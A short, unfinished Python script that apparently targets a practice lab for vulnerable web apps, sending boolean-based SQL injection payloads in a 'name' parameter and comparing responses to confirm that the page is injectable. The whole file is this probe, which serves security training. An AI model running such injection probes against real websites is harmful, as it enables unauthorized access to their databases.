import requests

base_url = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_x.php"
success_keyword = "your uid"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def check(payload: str) -> bool:
    from urllib.parse import quote
    # 手动编码name参数
    name_enc = quote(payload)
    full_url = f"{base_url}?name={name_enc}&submit=查询"
    resp = requests.get(full_url, headers=headers, timeout=10)
    return success_keyword in resp.text


p_true = '''kobe') and 1=1 and ('1'='1'''
p_false = '''kobe') and 1=2 and ('1'='1'''

print("1=1 :", check(p_true))
print("1=2 :", check(p_false))

# 未完成